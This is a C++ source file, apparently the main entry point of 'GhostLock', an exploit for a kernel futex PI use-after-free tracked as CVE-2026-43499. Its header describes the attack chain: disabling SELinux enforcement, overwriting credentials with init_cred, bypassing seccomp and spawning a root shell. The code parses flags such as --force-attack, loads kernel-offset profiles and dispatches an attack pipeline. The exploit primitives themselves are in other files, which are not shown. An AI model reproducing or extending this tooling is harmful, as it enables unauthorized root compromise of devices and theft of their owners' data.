/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::attack,
 * ghostlock::session::victim, ghostlock::race and ghostlock::session::stages.
 */

#include "common.h"
#include "legacy/legacy_entrypoint_starter.h"
#include "profile/entry.h"
#include "support/fatal_error.hpp"
#include "route/orchestrator.hpp"

#include <array>
#include <memory>
#include <string>
#include <string_view>

using namespace ghostlock;


int main(int argc, char **argv) {
    try {
        profile::kernel_offsets decoded = {};
        std::array<char, 256> release_buf{};
        binary_profile::component_ids ids{
            static_cast<uint16_t>(runtime::FrontendKind::RootChild),
            static_cast<uint16_t>(runtime::BackendKind::Cve2026_43499),
            0,
        };

        bool app_call = false;
        bool force_attack = false;
        const char *prebuilt_path = nullptr;
        const char *dump_dir = nullptr;
        for (int32_t i = 1; i < argc; i++) {
            if (std::string_view(argv[i]) == "--ghostlock-app-call") {
                app_call = true;
            } else if (std::string_view(argv[i]) == "--force-attack") {
                force_attack = true;
            } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
                prebuilt_path = argv[++i];
            } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
                dump_dir = argv[++i];
            } else {
                pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
                " [--dump-kernel-log <dir>] [--force-attack]\n", argv[0]);
                return 1;
            }
        }
        if (app_call && prebuilt_path) {
            pr_error("choose one entrypoint\n");
            return 1;
        }

        int32_t loaded;
        if (prebuilt_path != nullptr) {
            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size(), &ids);
        } else if (app_call) {
            loaded = profile_entry::read_glk1_stdin(&decoded, release_buf.data(), release_buf.size(), &ids);
        } else {
            loaded = legacy::start_legacy_entrypoint(&decoded, release_buf.data(), release_buf.size());
        }
        if (loaded != 0) {
            pr_error("cannot load profile\n");
            throw FatalError{};
        }

        auto &session = session::g_exploit_session;
        /* Batch 3.1: the component selection now comes from the wire. The
         * legacy entry carries no ids, so fall back to the decoded route. */
        if (ids.middleware == 0) {
            ids.middleware = static_cast<uint16_t>(decoded.route_kind());
        }
        const runtime::ComponentSelection selection{
            static_cast<runtime::FrontendKind>(ids.frontend),
            static_cast<runtime::BackendKind>(ids.backend),
            static_cast<runtime::MiddlewareKind>(ids.middleware),
        };
        if (!runtime::selection_supported(selection)) {
            /* Known-but-unavailable ids land here (unknown ids were rejected at
             * decode time), with the three dimensions named for diagnosis. */
            const std::string frontend(runtime::frontend_name(selection.frontend));
            const std::string backend(runtime::backend_name(selection.backend));
            const std::string middleware(runtime::middleware_name(selection.middleware));
            pr_error("unsupported component selection: frontend=%s backend=%s middleware=%s\n",
                     frontend.c_str(), backend.c_str(), middleware.c_str());
            throw FatalError{};
        }
        /* Batch 4 (D1=B): the orchestrator dispatches the catalogued pipeline
         * directly (backend steps + frontend handoff); a negative result means
         * no catalogued combination owns the selection. */
        const int32_t code = runtime::run_orchestrated_pipeline(
            session, selection, decoded, dump_dir, force_attack);
        if (code < 0) {
            pr_error("orchestrator rejected the component selection\n");
            throw FatalError{};
        }
        return code;
    } catch (const FatalError &) {
        return 1;
    }
}
